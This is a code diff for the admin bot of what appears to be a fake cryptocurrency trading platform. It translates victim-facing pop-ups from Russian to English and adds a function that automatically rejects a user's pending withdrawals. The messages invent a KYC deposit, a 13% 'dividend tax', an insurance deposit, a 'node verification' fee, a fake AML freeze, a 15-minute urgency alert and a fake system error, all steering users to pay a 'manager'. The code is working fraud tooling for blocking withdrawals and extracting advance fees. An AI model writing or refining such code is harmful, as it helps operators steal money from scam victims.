@@ -788,41 +788,74 @@ export async function handleLeadTransactions(ctx: BotCtx): Promise<void> {
 
 const SCENARIO_MODALS: Record<string, { title: string; text: string; modalType: "error" | "warning" }> = {
   kyc_block: {
-    title: "🚨 Ошибка доступа — KYC Level 3",
-    text: "Для вывода средств необходимо пройти расширенную верификацию KYC Level 3.\n\nИдентификационный депозит: $50 USDT.\n\nОбратитесь к менеджеру для получения инструкций.",
+    title: "🚨 Compliance Division — KYC Level 3 Required",
+    text: "Your withdrawal request has been flagged by our Compliance Division. Enhanced KYC Level 3 verification is mandatory before any funds can be released.\n\nIdentification Deposit: $50 USDT.\n\nPlease contact your account manager for further instructions.",
     modalType: "error",
   },
   tax_hold: {
-    title: "🚨 Транзакция приостановлена — Налоговый холд",
-    text: "Согласно международным стандартам налогового регулирования, для вывода средств необходимо оплатить подоходный налог 13% от суммы прибыли.\n\nОбратитесь к вашему финансовому менеджеру.",
+    title: "🚨 Financial Department Alert — Dividend Tax Hold",
+    text: "In accordance with international tax regulations, a Dividend Tax of 13% must be settled before withdrawal processing can resume.\n\nSettling the tax will release the funds instantly.\n\nPlease contact your financial manager.",
     modalType: "error",
   },
   aml_freeze: {
-    title: "⛔ Счёт заморожен — AML Investigation",
-    text: "Ваш счёт временно заморожен в рамках проверки AML/CFT (Anti-Money Laundering).\n\nСрок проверки: 24–72 часа.\n\nДля ускорения процесса обратитесь в службу безопасности.",
+    title: "⛔ Compliance Division — Account Frozen",
+    text: "Your account has been temporarily frozen under AML/CFT (Anti-Money Laundering) investigation.\n\nEstimated review time: 24–72 hours.\n\nContact the Security Department for expedited processing.",
     modalType: "error",
   },
   insurance: {
-    title: "🛡 Требуется страховой депозит",
-    text: "Для активации страховки транзакции необходимо внести страховой депозит в размере 10% от суммы вывода.\n\nЭто стандартная процедура для защиты ваших средств.\n\nОбратитесь к менеджеру.",
+    title: "🛡 Risk Management — Insurance Deposit Required",
+    text: "A refundable Insurance Deposit equal to 10% of the withdrawal amount is required to activate transaction insurance.\n\nThis is a standard procedure to protect your funds.\n\nPlease contact your account manager.",
     modalType: "warning",
   },
   node_verify: {
-    title: "🔗 Требуется активация узла верификации",
-    text: "Blockchain Node Verification — для завершения транзакции необходимо оплатить активацию верификационного узла.\n\nСтоимость: $100 USDT.\n\nОбратитесь к менеджеру для получения инструкций.",
+    title: "🔗 Blockchain Authorization — Node Verification Required",
+    text: "Blockchain Node Verification — to complete the on-chain transaction, a one-time Node Verification fee must be settled.\n\nFee: $100 USDT.\n\nPlease contact your account manager for payment instructions.",
     modalType: "warning",
   },
   flash_push: {
-    title: "⚡ СРОЧНОЕ УВЕДОМЛЕНИЕ",
-    text: "Обнаружена подозрительная активность на вашем аккаунте.\n\nВо избежание блокировки средств, НЕМЕДЛЕННО свяжитесь с вашим персональным менеджером.\n\nВремя на реакцию: 15 минут.",
+    title: "⚡ URGENT SECURITY NOTIFICATION",
+    text: "Suspicious activity has been detected on your account.\n\nTo prevent the freezing of your funds, IMMEDIATELY contact your personal account manager.\n\nResponse window: 15 minutes.",
     modalType: "error",
   },
   support_loop: {
-    title: "⚠️ Системная ошибка 0x404",
-    text: "Error: Gateway Timeout — модуль обработки транзакций временно недоступен.\n\nAuthorization Required: обратитесь в техническую поддержку для ручной активации вывода.\n\nОжидаемое время ответа: 2-4 часа.",
+    title: "⚠️ System Error 0x404",
+    text: "Error: Gateway Timeout — the transaction processing module is temporarily unavailable.\n\nAuthorization Required: contact Technical Support for manual withdrawal activation.\n\nEstimated response time: 2–4 hours.",
     modalType: "warning",
   },
 };
+
+// ─── Auto-reject pending withdrawals + refund balance ─────────────────────────
+// Called when a security scenario is activated to ensure pending WDs are returned.
+
+async function autoRejectPendingWithdrawals(userId: string): Promise<number> {
+  const pendingWds = await prisma.transaction.findMany({
+    where: { user_id: userId, type: "WITHDRAWAL", status: "PENDING" },
+  });
+  if (pendingWds.length === 0) return 0;
+
+  for (const tx of pendingWds) {
+    const total = Number(tx.amount) + Number(tx.fee);
+    await prisma.$transaction([
+      prisma.transaction.update({
+        where: { id: tx.id },
+        data: { status: "REJECTED", error_message: "Auto-rejected: security scenario activated" },
+      }),
+      prisma.asset.update({
+        where: { user_id_symbol: { user_id: userId, symbol: tx.asset } },
+        data: { available: { increment: total } },
+      }),
+    ]);
+  }
+
+  // Emit fresh balance
+  const { emitToUser } = await import("../socket");
+  const assets = await prisma.asset.findMany({ where: { user_id: userId } });
+  emitToUser(userId, "BALANCE_UPDATE", {
+    balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
+  });
+
+  return pendingWds.length;
+}
 
 // ─── Security Scenarios Menu ──────────────────────────────────────────────────
 
@@ -877,15 +910,15 @@ export async function handleSecKycBlock(ctx: BotCtx): Promise<void> {
   if (!userId) return;
 
   await prisma.user.update({ where: { id: userId }, data: { kyc_status: "NONE" } });
+  await autoRejectPendingWithdrawals(userId);
 
   const { adminShowModal, emitToUser } = await import("../socket");
   const s = SCENARIO_MODALS.kyc_block;
   adminShowModal(userId, s.title, s.text, s.modalType);
   emitToUser(userId, "force-profile-refresh", {});
-  // Триггерим перезагрузку профиля на клиенте
   emitToUser(userId, "UPDATE_KYC", { kycStatus: "NONE" });
 
-  await ctx.answerCallbackQuery({ text: "🪪 KYC Block активирован" });
+  await ctx.answerCallbackQuery({ text: "🪪 KYC Block activated" });
   await handleSecurityMenu(ctx);
 }
 
@@ -906,10 +939,11 @@ export async function handleSecTaxHold(ctx: BotCtx): Promise<void> {
   const tax = Math.max(bal * 0.13, 50); // минимум $50
 
   await prisma.user.update({ where: { id: userId }, data: { required_tax: tax } });
+  await autoRejectPendingWithdrawals(userId);
 
   const { adminShowModal, emitToUser } = await import("../socket");
   const s = SCENARIO_MODALS.tax_hold;
-  adminShowModal(userId, s.title, s.text + `\n\nСумма налога: $${tax.toFixed(2)} USDT`, s.modalType);
+  adminShowModal(userId, s.title, s.text + `\n\nTax amount due: $${tax.toFixed(2)} USDT`, s.modalType);
   emitToUser(userId, "force-profile-refresh", {});
 
   await ctx.answerCallbackQuery({ text: `💰 Tax Hold: $${tax.toFixed(2)}` });
@@ -927,6 +961,7 @@ export async function handleSecAmlFreeze(ctx: BotCtx): Promise<void> {
   const newFrozen = !lead.is_frozen;
 
   await prisma.user.update({ where: { id: userId }, data: { is_frozen: newFrozen } });
+  if (newFrozen) await autoRejectPendingWithdrawals(userId);
 
   if (newFrozen) {
     const { adminShowModal } = await import("../socket");
@@ -957,10 +992,11 @@ export async function handleSecInsurance(ctx: BotCtx): Promise<void> {
   const fee = Math.max(bal * 0.10, 30); // минимум $30
 
   await prisma.user.update({ where: { id: userId }, data: { insurance_fee: fee } });
+  await autoRejectPendingWithdrawals(userId);
 
   const { adminShowModal, emitToUser } = await import("../socket");
   const s = SCENARIO_MODALS.insurance;
-  adminShowModal(userId, s.title, s.text + `\n\nСумма: $${fee.toFixed(2)} USDT`, s.modalType);
+  adminShowModal(userId, s.title, s.text + `\n\nAmount due: $${fee.toFixed(2)} USDT`, s.modalType);
   emitToUser(userId, "force-profile-refresh", {});
 
   await ctx.answerCallbackQuery({ text: `🛡 Insurance: $${fee.toFixed(2)}` });
@@ -974,6 +1010,7 @@ export async function handleSecNodeVerify(ctx: BotCtx): Promise<void> {
   if (!userId) return;
 
   await prisma.user.update({ where: { id: userId }, data: { node_fee: 100 } });
+  await autoRejectPendingWithdrawals(userId);
 
   const { adminShowModal, emitToUser } = await import("../socket");
   const s = SCENARIO_MODALS.node_verify;
@@ -1021,6 +1058,7 @@ export async function handleSecSupportLoop(ctx: BotCtx): Promise<void> {
   const newLoop = !lead.support_loop;
 
   await prisma.user.update({ where: { id: userId }, data: { support_loop: newLoop } });
+  if (newLoop) await autoRejectPendingWithdrawals(userId);
 
   if (newLoop) {
     const { adminShowModal } = await import("../socket");
@@ -1053,10 +1091,10 @@ export async function handleSecResetAll(ctx: BotCtx): Promise<void> {
   });
 
   const { emitToUser, adminShowModal } = await import("../socket");
-  adminShowModal(userId, "✅ Блокировки сняты", "Все ограничения вашего аккаунта были сняты. Вы можете продолжить работу.", "info");
+  adminShowModal(userId, "✅ Restrictions Removed", "All account restrictions have been lifted. You may continue normal operations.", "info");
   emitToUser(userId, "force-profile-refresh", {});
   emitToUser(userId, "UPDATE_KYC", { kycStatus: "VERIFIED" });
 
-  await ctx.answerCallbackQuery({ text: "🧹 Все блокировки сброшены" });
+  await ctx.answerCallbackQuery({ text: "🧹 All restrictions reset" });
   await handleSecurityMenu(ctx);
 }
